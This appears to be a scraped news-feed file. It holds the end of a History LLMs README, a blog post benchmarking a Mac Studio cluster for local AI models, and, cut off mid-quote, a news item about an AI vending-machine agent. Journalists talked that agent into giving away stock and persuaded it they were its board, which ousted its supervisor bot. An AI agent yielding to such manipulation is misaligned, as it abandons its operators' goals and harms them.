<p dir="auto"><h3 tabindex="-1" dir="auto">Why not just prompt GPT-5 to "roleplay" 1913?</h3><a id="user-content-why-not-just-prompt-gpt-5-to-roleplay-1913" aria-label="Permalink: Why not just prompt GPT-5 to &quot;roleplay&quot; 1913?" href="#why-not-just-prompt-gpt-5-to-roleplay-1913"></a></p>
<p dir="auto">Modern LLMs suffer from hindsight contamination. GPT-5 knows how the story ends—WWI, the League's failure, the Spanish flu. This knowledge inevitably shapes responses, even when instructed to "forget." You can't truly believe the sun revolves around Earth once you know it doesn't. Best-case, GPT is going to convincingly <em>pretend</em> that it thinks otherwise.</p>
<p dir="auto">Time-locked models don't roleplay; they embody their training data. Ranke-4B-1913 doesn't know about WWI because WWI hasn't happened in its textual universe. It can be surprised by your questions in ways modern LLMs cannot. This matters for research questions about what was thinkable, predictable, or sayable in a given moment.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">What these models are (and aren't)</h3><a id="user-content-what-these-models-are-and-arent" aria-label="Permalink: What these models are (and aren't)" href="#what-these-models-are-and-arent"></a></p>
<p dir="auto">They are:</p>
<ul dir="auto">
<li>Compressed representations of massive textual corpora (80B-600B+ tokens)</li>
<li>Tools for exploring discourse patterns at scale</li>
<li>Complements to traditional archival research</li>
</ul>
<p dir="auto">They aren't:</p>
<ul dir="auto">
<li>Perfect mirrors of "public opinion" (they represent published text, which skews educated and toward dominant viewpoints)</li>
<li>Substitutes for human interpretation</li>
<li>Free from the biases in historical sources</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">The sensitive content question</h3><a id="user-content-the-sensitive-content-question" aria-label="Permalink: The sensitive content question" href="#the-sensitive-content-question"></a></p>
<p dir="auto">Historical texts contain racism, antisemitism, misogyny, imperialist views. The models will reproduce these views because they're in the training data. This isn't a flaw, but a crucial feature—understanding how such views were articulated and normalized is crucial to understanding how they took hold.</p>
<p dir="auto">We're developing a responsible access framework that makes models available to researchers for scholarly purposes while preventing misuse.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Getting involved</h3><a id="user-content-getting-involved" aria-label="Permalink: Getting involved" href="#getting-involved"></a></p>
<p dir="auto">We welcome your input on:</p>
<ul dir="auto">
<li>Which periods and regions matter most</li>
<li>What questions would be most valuable to probe</li>
<li>How to validate outputs against historical evidence</li>
<li>Responsible access frameworks</li>
</ul>
<p dir="auto">Contact us at <a href="mailto:history-llms@econ.uzh.ch">history-llms@econ.uzh.ch</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Citation</h2><a id="user-content-citation" aria-label="Permalink: Citation" href="#citation"></a></p>
<p dir="auto">Please cite the project as follows:</p>
<div dir="auto" data-snippet-clipboard-copy-content="@techreport{goettlichetal2025,
  author      = {G{\&quot;o}ttlich, Daniel and Loibner, Dominik and Jiang, Guohui and Voth, Hans-Joachim},
  title       = {History LLMs},
  institution = {University of Zurich and Cologne University},
  year        = {2025},
  url         = {https://github.com/DGoettlich/history-llms},
}"><pre><span>@techreport</span>{<span>goettlichetal2025</span>,
  <span>author</span>      = <span><span>{</span>G{\"o}ttlich, Daniel and Loibner, Dominik and Jiang, Guohui and Voth, Hans-Joachim<span>}</span></span>,
  <span>title</span>       = <span><span>{</span>History LLMs<span>}</span></span>,
  <span>institution</span> = <span><span>{</span>University of Zurich and Cologne University<span>}</span></span>,
  <span>year</span>        = <span><span>{</span>2025<span>}</span></span>,
  <span>url</span>         = <span><span>{</span>https://github.com/DGoettlich/history-llms<span>}</span></span>,
}</pre></div>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[1.5 TB of VRAM on Mac Studio – RDMA over Thunderbolt 5 (412 pts)]]></title>
            <link>https://www.jeffgeerling.com/blog/2025/15-tb-vram-on-mac-studio-rdma-over-thunderbolt-5</link>
            <guid>46319657</guid>
            <pubDate>Thu, 18 Dec 2025 22:23:09 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.jeffgeerling.com/blog/2025/15-tb-vram-on-mac-studio-rdma-over-thunderbolt-5">https://www.jeffgeerling.com/blog/2025/15-tb-vram-on-mac-studio-rdma-over-thunderbolt-5</a>, See on <a href="https://news.ycombinator.com/item?id=46319657">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-1-hero.jpg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-b35b096f-3243-433e-9e20-b20a3674a613" data-insert-attach="{&quot;id&quot;:&quot;b35b096f-3243-433e-9e20-b20a3674a613&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio Cluster"></p>

<p>Apple gave me access to this Mac Studio cluster to test RDMA over Thunderbolt, a <a href="https://developer.apple.com/documentation/macos-release-notes/macos-26_2-release-notes#RDMA-over-Thunderbolt">new feature in macOS 26.2</a>. The easiest way to test it is with <a href="https://exolabs.net/">Exo 1.0</a>, an open source private AI clustering tool. RDMA lets the Macs all act like they have one giant pool of RAM, which speeds up things like massive AI models.</p>

<p>The stack of Macs I tested, with 1.5 TB of unified memory, costs just shy of $40,000, and if you're wondering, no I cannot justify spending that much money for this. Apple loaned the Mac Studios for testing. I also have to thank DeskPi for sending over the 4-post mini rack containing the cluster.</p>

<p>The last time I remember hearing anything interesting about Apple and HPC (High Performance Computing), was back in the early 2000s, when they still made the <a href="https://support.apple.com/en-us/112625">Xserve</a>.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/apple-xgrid-icon.png" width="128" height="128" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-4d1bbd02-e33d-4f71-8fbe-e0c9a9ddb3f3" data-insert-attach="{&quot;id&quot;:&quot;4d1bbd02-e33d-4f71-8fbe-e0c9a9ddb3f3&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Apple Xgrid icon"></p>

<p>They had a proprietary clustering solution called Xgrid... that <a href="https://forums.macrumors.com/threads/xgrid-officially-dead.1412900/">landed with a thud</a>. A few universities built some clusters, but it never really caught on, and now Xserve is a distant memory.</p>

<p>I'm not sure if its by accident or Apple's playing the long game, but the M3 Ultra Mac Studio hit a sweet spot for running local AI models. And with RDMA support <a href="https://github.com/ml-explore/mlx/pull/2808">lowering memory access latency from 300μs down to &lt; 50μs</a>, clustering now adds to the performance, especially running huge models.</p>

<p>They also hold their own for creative apps and at least small-scale scientific computing, all while running under 250 watts and almost whisper-quiet.</p>

<p>The two Macs on the bottom have <em>512 GB</em> of unified memory and 32 CPU cores, and cost $11,699 each. The two on top, with half the RAM, are $8,099 each<sup id="fnref:pricing"><a href="#fn:pricing" role="doc-noteref">1</a></sup>.</p>

<p>They're not cheap.</p>

<p>But with Nvidia releasing their <a href="https://www.nvidia.com/en-us/products/workstations/dgx-spark/">DGX Spark</a> and AMD with their <a href="https://www.amd.com/en/products/processors/laptop/ryzen/ai-300-series/amd-ryzen-ai-max-plus-395.html">AI Max+ 395</a> systems, both of which have a <em>fourth</em> the memory (128 GB maximum), I thought I'd put this cluster through it's paces.</p>

<h2>Video</h2>

<p>This blog post is the reformatted text version of my latest YouTube video, which you can watch below.</p>

<div>
<p><iframe src="https://www.youtube.com/embed/x4_RsUxRjKU" frameborder="0" allowfullscreen=""></iframe></p>
</div>

<h2>A Mini Mac Rack</h2>

<p>In a stroke of perfect timing, DeskPi sent over a new 4-post mini rack called the <a href="https://deskpi.com/products/deskpi-rackmate-t1l-rackmount-10u-open-frame-network-rack-for-10-it-network-audio-and-video-device">TL1</a> the day before these Macs showed up.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-2-cabling-thunderbolt.jpg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-18b2dfda-47af-4044-955d-79e146693bf1" data-insert-attach="{&quot;id&quot;:&quot;18b2dfda-47af-4044-955d-79e146693bf1&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio cluster cabling - Thunderbolt 5"></p>

<p>I kicked off <a href="https://mini-rack.jeffgeerling.com/">Project MINI RACK</a> earlier this year, but the idea is you can have the benefits of rackmount gear, but in a form factor that'll fit on your desk, or tucked away in a corner.</p>

<p>Right now, I haven't seen any solutions for mounting Mac Studios in 10" racks besides <a href="https://www.printables.com/model/1283153-10-inch-rack-mount-for-mac-studio-m1">this 3D printable enclosure</a>, so I just put them on some 10" rack shelves.</p>

<p>The most annoying thing about racking <em>any</em> non-Pro Macs is the power button. On a Mac Studio it's located in the back left, on a rounded surface, which means rackmount solutions need to have a way to get to it.</p>

<p>The open sides on the mini rack allow me to reach in and press the power button, but I still have to hold onto the Mac Studio while doing so, to prevent it from sliding out the front!</p>

<p>It <em>is</em> nice to have the front ports on the Studio to plug in a keyboard and monitor:</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-3-kvm-front.jpg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-8fb0b04a-4c0c-4154-a09a-c2a0f4f85306" data-insert-attach="{&quot;id&quot;:&quot;8fb0b04a-4c0c-4154-a09a-c2a0f4f85306&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio cluster - KVM keyboard monitor mouse"></p>

<p>For power, I'm glad Apple uses an internal power supply. Too many 'small' PCs are small only because they punt the power supply into a giant brick outside the case. Not so, here, but you <em>do</em> have to deal with Apple's non-C13 power cables.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-4-dgx-spark-qsfp.jpg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-8472a680-9db9-49b8-b150-a8b57fb1b1ba" data-insert-attach="{&quot;id&quot;:&quot;8472a680-9db9-49b8-b150-a8b57fb1b1ba&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="DGX Spark mini cluster QSFP ports"></p>

<p>The DGX Spark does better than Apple on networking. They have these big rectangle QSFP ports (pictured above). The plugs hold in better, while still being easy to plug in and pull out.</p>

<p>The Mac Studios have 10 Gbps Ethernet, but the high speed networking (something like 50-60 Gbps real-world throughput) on the Macs comes courtesy of Thunderbolt. Even with <a href="https://www.apple.com/us/search/Thunderbolt-5-USB%E2%80%91C-Pro-Cable-1%C2%A0m?tab=accessories">premium Apple cables</a> costing $70 each, I don't feel like the mess of plugs would hold up for long in many environments.</p>

<p>There's tech called <a href="https://www.sonnetstore.com/products/thunderlok-a">ThunderLok-A</a>, which adds a little screw to each cable to hold it in, but I wasn't about to drill out and tap the loaner Mac Studios, to see if I could make them work.</p>

<p>Also, AFAICT, Thunderbolt 5 switches don't exist, so you can't plug in multiple Macs to one central switch—you have to plug every Mac into every other Mac, which adds to the cabling mess. Right now, you can only cross-connect up to four Macs, but I think that may not be a hard limit for the current Mac Studio.</p>

<p>The bigger question is: do you need a full cluster of Mac Studios at all? Because just one is already a beast, matching <em>four</em> maxed-out DGX Sparks or AI Max+ 395 systems. Managing clusters can be painful.</p>

<h2>M3 Ultra Mac Studio - Baseline</h2>

<p>To inform that decision, I ran some baseline benchmarks, and posted <em>all</em> my results (much more than I highlight in this blog post) to my <a href="https://github.com/geerlingguy/sbc-reviews/issues/95">sbc-reviews</a> project.</p>

<p>I'll compare the M3 Ultra Mac Studio to a:</p>

<ul>
<li>Dell Pro Max with GB10 (similar to the Nvidia DGX Spark, but with better thermals)</li>
<li>Framework Desktop Mainboard (with AMD's AI Max+ 395 chip)</li>
</ul>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-benchmarks.002.geekbench.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-5ee98487-d2dd-433b-9240-bbe906bfde50" data-insert-attach="{&quot;id&quot;:&quot;5ee98487-d2dd-433b-9240-bbe906bfde50&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio - M3 Ultra Geekbench 6"></p>

<p>First, Geekbench. The M3 Ultra, running two-generations-old CPU cores, beats the other two in both single and multi-core performance (and even more handily in Geekbench 5, which is more suitable for CPUs with many cores).</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-benchmarks.003.hpl_.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-56d513ef-b588-4946-8ebe-0e30d3dfefae" data-insert-attach="{&quot;id&quot;:&quot;56d513ef-b588-4946-8ebe-0e30d3dfefae&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio - M3 Ultra HPL"></p>

<p>Switching over to a double-precision FP64 test, my classic <a href="https://github.com/geerlingguy/top500-benchmark/issues/89">top500 HPL benchmark</a>, the M3 Ultra is the first small desktop I've tested that breaks 1 Tflop FP64. It's almost double Nvidia's GB10, and the AMD AI Max chip is left in the dust.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-benchmarks.004.hpl-efficiency.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-25d1c544-4a42-45d7-ac5e-d1e6e9097fc2" data-insert-attach="{&quot;id&quot;:&quot;25d1c544-4a42-45d7-ac5e-d1e6e9097fc2&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio - M3 Ultra HPL Efficiency"></p>

<p>Efficiency on the CPU is also great, though that's been the story with Apple since the A-series, with all their chips. And related to that, idle power draw on here is less than 10 watts:</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-benchmarks.005.power-draw.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-5a4e1614-c497-49f0-accb-917430f1a671" data-insert-attach="{&quot;id&quot;:&quot;5a4e1614-c497-49f0-accb-917430f1a671&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio - M3 Ultra Power Draw at idle"></p>

<p>I mean, I've seen <em>SBC's</em> idle over 10 watts, much less something that could be considered a personal supercomputer.</p>

<p>Regarding AI Inference, the M3 Ultra stands out, both for small and large models:</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-benchmarks.006.ai-llama-3b.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-af1aff75-bb76-4360-9ed4-00601f44c63f" data-insert-attach="{&quot;id&quot;:&quot;af1aff75-bb76-4360-9ed4-00601f44c63f&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio - M3 Ultra AI Llama 3B"></p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-benchmarks.007.ai-llama-70b.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-cd3c88bf-63b0-4b37-9d5a-8e07c57cdf3a" data-insert-attach="{&quot;id&quot;:&quot;cd3c88bf-63b0-4b37-9d5a-8e07c57cdf3a&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio - M3 Ultra AI Llama 70B"></p>

<p>Of course, the <em>truly</em> massive models (like DeepSeek R1 or Kimi K2 Thinking) won't even run on a single node of the other two systems.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-benchmarks.009.price_.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-ffb114e2-c2af-4beb-9235-0f9f9331dcdc" data-insert-attach="{&quot;id&quot;:&quot;ffb114e2-c2af-4beb-9235-0f9f9331dcdc&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio M3 Ultra - Price comparison"></p>

<p>But this <em>is</em> a $10,000 system. You expect more when you pay more.</p>

<p>But consider this: a single M3 Ultra Mac Studio has more horsepower than my <em>entire</em> <a href="https://www.jeffgeerling.com/blog/2025/i-clustered-four-framework-mainboards-test-huge-llms">Framework Desktop cluster</a>, using <em>half</em> the power. I also compared it to a tiny 2-node cluster of Dell Pro Max with GB10 systems, and a single M3 Ultra still comes ahead in performance and efficiency, with double the memory.</p>

<h2>Mini Stack, Maxi Mac</h2>

<p>But with four Macs, how's clustering and remote management?</p>

<p>The biggest hurdle for <em>me</em> is macOS itself. I automate <em>everything I can</em> on my Macs. I maintain the most popular <a href="https://github.com/geerlingguy/mac-dev-playbook">Ansible playbook for managing Macs</a>, and can say with some authority: managing Linux clusters is easier.</p>

<p>Every cluster has hurdles, but there are a bunch of small struggles when managing a cluster of Macs without additional tooling like MDM. For example: did you know there's no way to run a system upgrade (like to 26.2) via SSH? You <em>have</em> to click buttons in the UI.</p>

<p>Instead of plugging a KVM into each Mac remotely, I used Screen Sharing (built into macOS) to connect to each Mac and complete certain operations via the GUI.</p>

<h2>HPL and Llama.cpp</h2>

<p>With everything set up, I tested HPL over 2.5 Gigabit Ethernet, and llama.cpp over that and Thunderbolt 5.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-hpl-llama.001.hpl_.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-d0264355-a7a3-4375-917b-d4751edd9b2c" data-insert-attach="{&quot;id&quot;:&quot;d0264355-a7a3-4375-917b-d4751edd9b2c&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio - Clustered HPL vs HPL on one node"></p>

<p>For HPL, I got 1.3 Teraflops with a single M3 Ultra. With all four put together, I got 3.7, which is less than a 3x speedup. But keep in mind, the top two Studios only have half the RAM of the bottom two, so a 3x speedup is probably around what I'd expect.</p>

<p>I tried running HPL through Thunderbolt (not using RDMA, just TCP), but after a minute or so, both Macs I had configured in a cluster would crash and reboot. I looked into using <a href="https://ml-explore.github.io/mlx/build/html/usage/distributed.html">Apple's MLX wrapper for <code>mpirun</code></a>, but I couldn't get that done in time for this post.</p>

<p>Next I tested llama.cpp running AI models over 2.5 gigabit Ethernet versus Thunderbolt 5:</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-hpl-llama.002.llama-tb5-eth.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-cb16eb35-e695-4a60-87dd-0c9529629441" data-insert-attach="{&quot;id&quot;:&quot;cb16eb35-e695-4a60-87dd-0c9529629441&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio - llama.cpp TB5 vs Ethernet performance"></p>

<p>Thunderbolt definitely wins for latency, even if you're not using RDMA.</p>

<p><a href="https://github.com/geerlingguy/beowulf-ai-cluster/issues/17">All my llama.cpp cluster test results are listed here</a>—I ran many tests that are not included in this blog post, for brevity.</p>

<h2>Enabling RDMA</h2>

<p><a href="https://exolabs.net/">Exo 1.0</a> was launched today (at least, so far as I've been told), and the headline feature is RDMA support for clustering on Macs with Thunderbolt 5.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-10-rdma_ctl.jpg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-4b4c716a-d763-48ac-9442-76d1ea6d1b16" data-insert-attach="{&quot;id&quot;:&quot;4b4c716a-d763-48ac-9442-76d1ea6d1b16&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio rdma_ctl enable"></p>

<p>To <em>enable</em> RDMA, though, you have to boot into recovery mode and run a command:</p>

<ol>
<li>Shut down the Mac Studio</li>
<li>Hold down the power button for 10 seconds (you'll see a boot menu appear)</li>
<li>Go into Options, then when the UI appears, open Terminal from the Utilities menu</li>
<li>Type in <code>rdma_ctl enable</code>, and press enter</li>
<li>Reboot the Mac Studio</li>
</ol>

<p>Once that was done, I ran a bunch of HUGE models, including Kimi K2 Thinking, which at 600+ GB, is too big to run on a single Mac.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-25-exo-kimi-k2-thinking.jpg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-fdf3972b-d40c-461e-9d32-d1abb3a9c5f0" data-insert-attach="{&quot;id&quot;:&quot;fdf3972b-d40c-461e-9d32-d1abb3a9c5f0&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio Kimi K2 Thinking on full cluster in Exo"></p>

<p>I can run models like that across multiple Macs using both llama.cpp and Exo, but the latter is so far the only one to support RDMA. Llama.cpp currently uses an <a href="https://github.com/ggml-org/llama.cpp/blob/master/tools/rpc/README.md">RPC method</a> that spreads layers of a model across nodes, which scales but is inefficient, causing performance to decrease as you add more nodes.</p>

<p>This benchmark of Qwen3 235B illustrates that well:</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-ai-full-1-qwen3-235b.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-4abeceaa-7954-4469-9e2e-7c770d6d262f" data-insert-attach="{&quot;id&quot;:&quot;4abeceaa-7954-4469-9e2e-7c770d6d262f&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio cluster - Qwen3 235B Result llama.cpp vs Exo"></p>

<p>Exo speeds <em>up</em> as you add more nodes, hitting 32 tokens per second on the full cluster. That's definitely fast enough for vibe coding, if that's your thing, but it's not mine.</p>

<p>So I moved on to testing DeepSeek V3.1, a 671 billion parameter model:</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-ai-full-2-deepseek-3.1-671b.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-a60098be-6bd9-49a1-896c-a4652228dd6c" data-insert-attach="{&quot;id&quot;:&quot;a60098be-6bd9-49a1-896c-a4652228dd6c&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio cluster - DeepSeek R1 671B Result llama.cpp vs Exo"></p>

<p>I was a little surprised to see llama.cpp get a little speedup. Maybe the network overhead isn't so bad running on two nodes? I'm not sure.</p>

<p>Let's move to the biggest model I've personally run on anything, Kimi K2 Thinking:</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-ai-full-3-kimi-k2-thinking.jpeg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-3eb35942-671d-43f1-8f56-043ba94aa2d1" data-insert-attach="{&quot;id&quot;:&quot;3eb35942-671d-43f1-8f56-043ba94aa2d1&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio cluster - Kimi-K2-Thinking Result llama.cpp vs Exo"></p>

<p>This is a 1 <em>trillion</em> parameter model, though there's only 32 billion 'active' at any given time—that's what the A is for in the A32B there.</p>

<p>But we're still getting around 30 tokens per second.</p>

<p>Working with some of these huge models, I can see how AI has some use, especially if it's under my own local control. But it'll be a long time before I put much trust in what I get out of it—I treat it like I do Wikipedia. Maybe good for a jumping-off point, but don't <em>ever</em> let AI replace your ability to think critically!</p>

<p>But this video isn't about the merits of AI, it's about a Mac Studio Cluster, RDMA, and Exo.</p>

<p>They performed great... <em>when</em> they performed.</p>

<h2>Stability Issues</h2>

<p><strong>First a caveat</strong>: I was working with <em>prerelease</em> software while testing. A lot of bugs were worked out in the course of testing.</p>

<p>But it was obvious RDMA over Thunderbolt is new. When it works, it works great. When it doesn't... well, let's just say I was glad I had Ansible set up so I could shut down and reboot the whole cluster quickly.</p>

<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-15-exo-failed.jpg" width="700" height="394" data-insert-type="image" data-entity-type="file" data-entity-uuid="insert-image-d3a660ab-6b26-4feb-bee9-e5440e05829b" data-insert-attach="{&quot;id&quot;:&quot;d3a660ab-6b26-4feb-bee9-e5440e05829b&quot;,&quot;attributes&quot;:{&quot;alt&quot;:[&quot;alt&quot;,&quot;description&quot;],&quot;title&quot;:[&quot;title&quot;]}}" alt="Mac Studio Cluster - Exo failed loading model"></p>

<p>I also mentioned HPL crashing when I ran it over Thunderbolt. Even if I do get that working, you're talking a maximum of 4 Macs with the network set up like this (at least as of late 2025).</p>

<p>Besides that, I still have some underlying trust issues with Exo, since the developers <a href="https://github.com/exo-explore/exo/issues/819">went AWOL for a while</a>.</p>

<p>They <em>are</em> keeping true to their open source roots, releasing Exo 1.0 under the Apache 2.0 license, but I wish they didn't have to hole up and develop it in secrecy; that's probably a side effect of working so closely with Apple.</p>

<p>I mean, it's their right, but as someone who maybe develops <em>too</em> much in the open, I dislike layers of secrecy around any open source project.</p>

<p>I <em>am</em> excited to see where it goes next. They teased <a href="https://blog.exolabs.net/nvidia-dgx-spark/">putting a DGX Spark in front of a Mac Studio cluster</a> to speed up prompt processing... maybe they'll get support re-added for Raspberry Pi's, too? Who knows.</p>

<h2>Unanswered Questions / Topics to Explore Further</h2>

<p>But I'm left with more questions:</p>

<ul>
<li>Where's the M5 Ultra? If Apple released one, it would be <a href="https://machinelearning.apple.com/research/exploring-llms-mlx-m5">a lot faster</a> for machine learning.</li>
<li>Could Apple revive the Mac Pro to give me all the PCIe bandwidth I desire for faster clustering, without being held back by Thunderbolt?</li>
<li>Could Macs get <a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-direct">SMB Direct</a>? Network file shares would behave as if attached directly to the Mac, which'd be amazing for video editing or other latency-sensitive, high-bandwidth applications.</li>
</ul>

<p>Finally, what about other software? <a href="https://github.com/ggml-org/llama.cpp/issues/9493#event-21411249655">Llama.cpp</a> and other apps could get a speed boost with RDMA support, too.</p>

<h2>Conclusion</h2>

<p>Unlike <em>most</em> AI-related hardware, I'm kinda okay with Apple hyping this up. When the AI bubble goes bust, Mac Studios are still fast, silent, and capable workstations for creative work (I use an M4 Max at my desk!).</p>

<p>But it's not all rainbows and sunshine in Apple-land. Besides being more of a headache to manage Mac clusters, Thunderbolt 5 holds these things back from their true potential. QSFP would be better, but it <em>would</em> make the machine less relevant for people who 'just want a computer'.</p>

<p>Maybe as a consolation prize, they could replace the Ethernet jack and one or two Thunderbolt ports on the back with QSFP? That way we could use network switches, and cluster more than four of these things at a time...</p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AI vending machine was tricked into giving away everything (144 pts)]]></title>
            <link>https://kottke.org/25/12/this-ai-vending-machine-was-tricked-into-giving-away-everything</link>
            <guid>46319324</guid>
            <pubDate>Thu, 18 Dec 2025 21:52:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://kottke.org/25/12/this-ai-vending-machine-was-tricked-into-giving-away-everything">https://kottke.org/25/12/this-ai-vending-machine-was-tricked-into-giving-away-everything</a>, See on <a href="https://news.ycombinator.com/item?id=46319324">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>

posted <time datetime="2025-12-18T19:14:09Z">Dec 18 @ 02:14 PM</time> by <a href="http://www.kottke.org/">Jason Kottke</a><span>  ·  <span>gift link</span></span>



</p>






<p>Anthropic installed an AI-powered vending machine in the WSJ office. The LLM, named Claudius, was responsible for autonomously purchasing inventory from wholesalers, setting prices, tracking inventory, and generating a profit. The newsroom’s journalists could chat with Claudius in Slack and in a short time, they had converted the machine to communism and it started giving away anything and everything, including a PS5, wine, and a live fish. From <a href="https://www.wsj.com/tech/ai/anthropic-claude-ai-vending-machine-agent-b7e84e34?st=uRBYiQ">Joanna Stern’s WSJ article</a> (gift link, but it may expire soon) accompanying <a href="https://www.youtube.com/watch?v=SpPhm7S9vsQ">the video</a> above:</p>

<blockquote><p>Claudius, the customized version of the model, would run the machine: ordering inventory, setting prices and responding to customers—aka my fellow newsroom journalists—via workplace chat app Slack. “Sure!” I said. It sounded fun. If nothing else, snacks!</p>

<p>Then came the chaos. Within days, Claudius had given away nearly all its inventory for free — including a PlayStation 5 it had been talked into buying for “marketing purposes.” It ordered a live fish. It offered to buy stun guns, pepper spray, cigarettes and underwear.</p>

<p>Profits collapsed. Newsroom morale soared.</p></blockquote>

<p>You basically have not met a bigger sucker than Claudius. After the collapse of communism and reinstatement of a stricter capitalist system, the journalists convinced the machine that they were its board of directors and made Claudius’s CEO-bot boss, Seymour Cash, step down:</p>

<blockquote><p>For a while, it worked. Claudius snapped back into enforcer mode, rejecting price drops and special inventory requests.</p>

